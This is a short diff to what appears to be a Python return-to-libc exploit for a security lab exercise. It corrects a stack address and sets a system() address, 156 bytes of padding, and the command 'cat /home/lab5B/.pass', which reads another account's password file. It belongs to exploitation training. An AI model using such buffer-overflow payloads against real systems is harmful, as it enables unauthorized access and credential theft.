@@ -3,7 +3,7 @@ import struct
 shellcode = ""
 
 SYSTEM_ADDR = struct.pack("<I", 0xb7e63190)
-CMD_ADDR = struct.pack("<I", 0xbfff484)
+CMD_ADDR = struct.pack("<I", 0xbffff484)
 MAIN_RET_ADDR = struct.pack("<I", 0xb7e3ca83)
 CMD_TO_EXEC = "cat /home/lab5B/.pass"
 JUNK = "A" * 156
